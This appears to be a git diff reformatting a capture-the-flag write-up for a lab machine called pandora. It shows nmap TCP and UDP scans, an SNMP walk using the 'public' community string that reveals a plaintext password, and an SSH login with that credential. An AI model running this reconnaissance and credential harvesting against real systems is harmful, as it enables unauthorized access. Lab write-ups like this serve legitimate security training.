@@ -1,6 +1,7 @@
 ### port scan
 
->└─$ nmap -p- -sSCV 10.10.11.136  --min-rate 999
+`└─$ nmap -p- -sSCV 10.10.11.136  --min-rate 999`
+```
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-09 19:22 AEDT
 Nmap scan report for 10.10.11.136
 Host is up (0.11s latency).
@@ -14,8 +15,9 @@ PORT   STATE SERVICE VERSION
 80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
 |_http-server-header: Apache/2.4.41 (Ubuntu)
 |_http-title: Play | Landing
-
->└─$ nmap -sU  10.10.11.136  --min-rate 999 -T 5 
+```
+`└─$ nmap -sU  10.10.11.136  --min-rate 999 -T 5 `
+```
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-09 19:59 AEDT
 Stats: 0:00:03 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan
 UDP Scan Timing: About 95.47% done; ETC: 19:59 (0:00:00 remaining)
@@ -24,23 +26,24 @@ Host is up (0.10s latency).
 Not shown: 990 open|filtered udp ports (no-response)
 PORT      STATE  SERVICE
 161/udp   open   snmp
-
->└─$ nmap -sU -sV -p 161 10.10.11.136  --min-rate 999 -T 5
+```
+`└─$ nmap -sU -sV -p 161 10.10.11.136  --min-rate 999 -T 5`
+```
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-09 20:04 AEDT
 Nmap scan report for 10.10.11.136
 Host is up (0.079s latency).
 
->PORT    STATE SERVICE VERSION
+PORT    STATE SERVICE VERSION
 161/udp open  snmp    SNMPv1 server; net-snmp SNMPv3 server (public)
 Service Info: Host: pandora
-
+```
 ##### port 80 - web nothing
 
 ##### port 161- snmp.
 
-snmpbulkwalk -Cr1000 -c public -v2c 10.10.11.136 > snmp-full-bullk
-
->iso.3.6.1.2.1.1.1.0 = STRING: "Linux pandora 5.4.0-91-generic #102-Ubuntu SMP Fri Nov 5 16:31:28 UTC 2021 x86_64"
+`snmpbulkwalk -Cr1000 -c public -v2c 10.10.11.136 > snmp-full-bullk`
+```
+iso.3.6.1.2.1.1.1.0 = STRING: "Linux pandora 5.4.0-91-generic #102-Ubuntu SMP Fri Nov 5 16:31:28 UTC 2021 x86_64"
 iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10
 iso.3.6.1.2.1.1.3.0 = Timeticks: (372749) 1:02:07.49
 iso.3.6.1.2.1.1.4.0 = STRING: "Daniel"
@@ -50,7 +53,7 @@ iso.3.6.1.2.1.1.7.0 = INTEGER: 72
 iso.3.6.1.2.1.1.8.0 = Timeticks: (2) 0:00:00.02
 iso.3.6.1.2.1.25.4.2.1.5.974 = STRING: "-o -p -- \\u --noclear tty1 linux"
 iso.3.6.1.2.1.25.4.2.1.5.1098 = STRING: "-u daniel -p HotelBabylon23"
-
+```
 //we get a credential, ssh
 ```└─$ ssh daniel@10.10.11.136 
 daniel@pandora:~$ id
